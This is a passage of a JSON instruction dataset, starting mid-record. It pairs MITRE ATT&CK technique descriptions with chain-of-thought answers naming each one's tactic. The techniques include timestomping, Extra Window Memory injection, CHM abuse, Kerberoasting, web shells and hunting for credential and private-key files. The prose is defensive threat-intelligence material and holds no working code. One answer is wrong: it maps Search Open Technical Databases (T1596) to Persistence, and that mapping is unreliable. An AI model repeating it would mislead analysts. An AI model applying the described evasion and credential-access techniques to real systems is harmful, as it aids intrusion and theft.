    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name Masquerading to hide malware and tools.",
      "answer": "The given description is related to sub technique Timestomp (T1070.006);\nSub technique Timestomp (T1070.006) is a type of technique Indicator Removal (T1070);\nTechnique Indicator Removal (T1070) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value.  \n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>. More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.   \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.?",
    "context": "",
    "output": "The given description is related to sub technique: Extra Window Memory Injection (T1055.011);\nSub technique Extra Window Memory Injection (T1055.011) is a type of technique Process Injection (T1055);\nTechnique Process Injection (T1055) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value.  \n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>. More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.   \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.",
      "answer": "The given description is related to sub technique: Extra Window Memory Injection (T1055.011);\nSub technique Extra Window Memory Injection (T1055.011) is a type of technique Process Injection (T1055);\nTechnique Process Injection (T1055) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX.  CHM content is displayed using underlying components of the Internet Explorer browser  loaded by the HTML Help executable program (hh.exe). \n\nA custom CHM file containing embedded payloads could be delivered to a victim then triggered by User Execution. CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe.",
    "context": "",
    "output": "The given description is related to sub technique: Compiled HTML File (T1218.001);\nSub technique Compiled HTML File (T1218.001) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX.  CHM content is displayed using underlying components of the Internet Explorer browser  loaded by the HTML Help executable program (hh.exe). \n\nA custom CHM file containing embedded payloads could be delivered to a victim then triggered by User Execution. CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe.",
      "answer": "The given description is related to sub technique: Compiled HTML File (T1218.001);\nSub technique Compiled HTML File (T1218.001) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user\u2019s local system, such as Outlook storage or cache files.\n\nOutlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB. IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\\Users\\<username>\\Documents\\Outlook Files` or `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook`.?",
    "context": "",
    "output": "The given description is related to sub technique: Local Email Collection (T1114.001);\nSub technique Local Email Collection (T1114.001) is a type of technique Email Collection (T1114);\nTechnique Email Collection (T1114) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user\u2019s local system, such as Outlook storage or cache files.\n\nOutlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB. IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\\Users\\<username>\\Documents\\Outlook Files` or `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook`.",
      "answer": "The given description is related to sub technique: Local Email Collection (T1114.001);\nSub technique Local Email Collection (T1114.001) is a type of technique Email Collection (T1114);\nTechnique Email Collection (T1114) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct Phishing for Information or Phishing. Establishing email accounts may also allow adversaries to abuse free services \u2013 such as trial periods \u2013 to Acquire Infrastructure for follow-on purposes.\n\nAdversaries may also take steps to cultivate a persona around the email account, such as through use of Social Media Accounts, to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: Domains).\n\nTo decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.?",
    "context": "",
    "output": "The given description is related to sub technique: Email Accounts (T1585.002);\nSub technique Email Accounts (T1585.002) is a type of technique Establish Accounts (T1585);\nTechnique Establish Accounts (T1585) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct Phishing for Information or Phishing. Establishing email accounts may also allow adversaries to abuse free services \u2013 such as trial periods \u2013 to Acquire Infrastructure for follow-on purposes.\n\nAdversaries may also take steps to cultivate a persona around the email account, such as through use of Social Media Accounts, to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: Domains).\n\nTo decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.",
      "answer": "The given description is related to sub technique: Email Accounts (T1585.002);\nSub technique Email Accounts (T1585.002) is a type of technique Establish Accounts (T1585);\nTechnique Establish Accounts (T1585) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through OS Credential Dumping. Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.\n\nIn cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files. They may also be found as parameters to deployment commands in container logs. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.?",
    "context": "",
    "output": "The given description is related to sub technique: Credentials In Files (T1552.001);\nSub technique Credentials In Files (T1552.001) is a type of technique Unsecured Credentials (T1552);\nTechnique Unsecured Credentials (T1552) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through OS Credential Dumping. Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.\n\nIn cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files. They may also be found as parameters to deployment commands in container logs. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.",
      "answer": "The given description is related to sub technique: Credentials In Files (T1552.001);\nSub technique Credentials In Files (T1552.001) is a type of technique Unsecured Credentials (T1552);\nTechnique Unsecured Credentials (T1552) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.\n\nWhen a device is registered to Azure AD, a device key and a transport key are generated and used to verify the device\u2019s identity. An adversary with access to the device may be able to export the keys in order to impersonate the device.\n\nOn network devices, private keys may be exported via Network Device CLI commands such as `crypto pki export`. \n\nSome private keys require a password or passphrase for operation, so an adversary may also use Input Capture for keylogging or attempt to Brute Force the passphrase off-line. These private keys can be used to authenticate to Remote Services like SSH or for use in decrypting other collected files such as email.?",
    "context": "",
    "output": "The given description is related to sub technique: Private Keys (T1552.004);\nSub technique Private Keys (T1552.004) is a type of technique Unsecured Credentials (T1552);\nTechnique Unsecured Credentials (T1552) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.\n\nWhen a device is registered to Azure AD, a device key and a transport key are generated and used to verify the device\u2019s identity. An adversary with access to the device may be able to export the keys in order to impersonate the device.\n\nOn network devices, private keys may be exported via Network Device CLI commands such as `crypto pki export`. \n\nSome private keys require a password or passphrase for operation, so an adversary may also use Input Capture for keylogging or attempt to Brute Force the passphrase off-line. These private keys can be used to authenticate to Remote Services like SSH or for use in decrypting other collected files such as email.",
      "answer": "The given description is related to sub technique: Private Keys (T1552.004);\nSub technique Private Keys (T1552.004) is a type of technique Unsecured Credentials (T1552);\nTechnique Unsecured Credentials (T1552) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.\n\nIn addition to user accounts, cloud accounts may be associated with services. Cloud providers handle the concept of service accounts in different ways. In Azure, service accounts include service principals and managed identities, which can be linked to various resources such as OAuth applications, serverless functions, and virtual machines in order to grant those resources permissions to perform various activities in the environment. In GCP, service accounts can also be linked to specific resources, as well as be impersonated by other accounts for Temporary Elevated Cloud Access. While AWS has no specific concept of service accounts, resources can be directly granted permission to assume roles.\n\nAdversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.\n\nOnce an adversary has created a cloud account, they can then manipulate that account to ensure persistence and allow access to additional resources - for example, by adding Additional Cloud Credentials or assigning Additional Cloud Roles.",
    "context": "",
    "output": "The given description is related to sub technique: Cloud Account (T1136.003);\nSub technique Cloud Account (T1136.003) is a type of technique Create Account (T1136);\nTechnique Create Account (T1136) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.\n\nIn addition to user accounts, cloud accounts may be associated with services. Cloud providers handle the concept of service accounts in different ways. In Azure, service accounts include service principals and managed identities, which can be linked to various resources such as OAuth applications, serverless functions, and virtual machines in order to grant those resources permissions to perform various activities in the environment. In GCP, service accounts can also be linked to specific resources, as well as be impersonated by other accounts for Temporary Elevated Cloud Access. While AWS has no specific concept of service accounts, resources can be directly granted permission to assume roles.\n\nAdversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.\n\nOnce an adversary has created a cloud account, they can then manipulate that account to ensure persistence and allow access to additional resources - for example, by adding Additional Cloud Credentials or assigning Additional Cloud Roles.",
      "answer": "The given description is related to sub technique: Cloud Account (T1136.003);\nSub technique Cloud Account (T1136.003) is a type of technique Create Account (T1136);\nTechnique Create Account (T1136) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant. Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account or taking advantage of renewal process gaps.\n\nSubdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.\n\nAdversaries who compromise a domain may also engage in domain shadowing by creating malicious subdomains under their control while keeping any existing DNS records. As service will not be disrupted, the malicious subdomains may go unnoticed for long periods of time.",
    "context": "",
    "output": "The given description is related to sub technique Domains (T1584.001);\nSub technique Domains (T1584.001) is a type of technique Compromise Infrastructure (T1584);\nTechnique Compromise Infrastructure (T1584) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant. Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account or taking advantage of renewal process gaps.\n\nSubdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.\n\nAdversaries who compromise a domain may also engage in domain shadowing by creating malicious subdomains under their control while keeping any existing DNS records. As service will not be disrupted, the malicious subdomains may go unnoticed for long periods of time.",
      "answer": "The given description is related to sub technique Domains (T1584.001);\nSub technique Domains (T1584.001) is a type of technique Compromise Infrastructure (T1584);\nTechnique Compromise Infrastructure (T1584) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to Brute Force. \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service).\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plaintext credentials. \n\nThis same behavior could be executed using service tickets captured from network traffic.\n\nCracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.?",
    "context": "",
    "output": "The given description is related to sub technique: Kerberoasting (T1558.003);\nSub technique Kerberoasting (T1558.003) is a type of technique Steal or Forge Kerberos Tickets (T1558);\nTechnique Steal or Forge Kerberos Tickets (T1558) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to Brute Force. \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service).\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plaintext credentials. \n\nThis same behavior could be executed using service tickets captured from network traffic.\n\nCracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.",
      "answer": "The given description is related to sub technique: Kerberoasting (T1558.003);\nSub technique Kerberoasting (T1558.003) is a type of technique Steal or Forge Kerberos Tickets (T1558);\nTechnique Steal or Forge Kerberos Tickets (T1558) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. China Chopper Web shell client).",
    "context": "",
    "output": "The given description is related to sub technique: Web Shell (T1505.003);\nSub technique Web Shell (T1505.003) is a type of technique Server Software Component (T1505);\nTechnique Server Software Component (T1505) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. China Chopper Web shell client).",
      "answer": "The given description is related to sub technique: Web Shell (T1505.003);\nSub technique Web Shell (T1505.003) is a type of technique Server Software Component (T1505);\nTechnique Server Software Component (T1505) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).\n\nIn on-premises Exchange and Exchange Online, the<code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.\n\nIn Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.",
    "context": "",
    "output": "The given description is related to sub technique Email Account (T1087.003);\nSub technique Email Account (T1087.003) is a type of technique Account Discovery (T1087);\nTechnique Account Discovery (T1087) is a type of tactic Discovery (TA0007);\nTherefore, the given description is related to tactic Discovery (TA0007).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).\n\nIn on-premises Exchange and Exchange Online, the<code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.\n\nIn Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.",
      "answer": "The given description is related to sub technique Email Account (T1087.003);\nSub technique Email Account (T1087.003) is a type of technique Account Discovery (T1087);\nTechnique Account Discovery (T1087) is a type of tactic Discovery (TA0007);\nTherefore, the given description is related to tactic Discovery (TA0007).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.\n\nFor example, if there is a Mach-O executable file called <code>evil.bin</code>, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to <code>evil.txt</code>, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to <code>evil.txt </code> (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed .\n\nAdversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.",
    "context": "",
    "output": "The given description is related to sub technique Space after Filename (T1036.006);\nSub technique Space after Filename (T1036.006) is a type of technique Masquerading (T1036);\nTechnique Masquerading (T1036) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.\n\nFor example, if there is a Mach-O executable file called <code>evil.bin</code>, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to <code>evil.txt</code>, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to <code>evil.txt </code> (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed .\n\nAdversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.",
      "answer": "The given description is related to sub technique Space after Filename (T1036.006);\nSub technique Space after Filename (T1036.006) is a type of technique Masquerading (T1036);\nTechnique Masquerading (T1036) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.\n\nAdversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates. Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content). Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Phishing for Information), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Trusted Relationship).",
    "context": "",
    "output": "The given description is related to sub technique Digital Certificates (T1596.003);\nSub technique Digital Certificates (T1596.003) is a type of technique Search Open Technical Databases (T1596);\nTechnique Search Open Technical Databases (T1596) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.\n\nAdversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates. Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content). Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Phishing for Information), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Trusted Relationship).",
      "answer": "The given description is related to sub technique Digital Certificates (T1596.003);\nSub technique Digital Certificates (T1596.003) is a type of technique Search Open Technical Databases (T1596);\nTechnique Search Open Technical Databases (T1596) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
    "context": "",
    "output": "The given description is related to sub technique: Web Protocols (T1071.001);\nSub technique Web Protocols (T1071.001) is a type of technique Application Layer Protocol (T1071);\nTechnique Application Layer Protocol (T1071) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
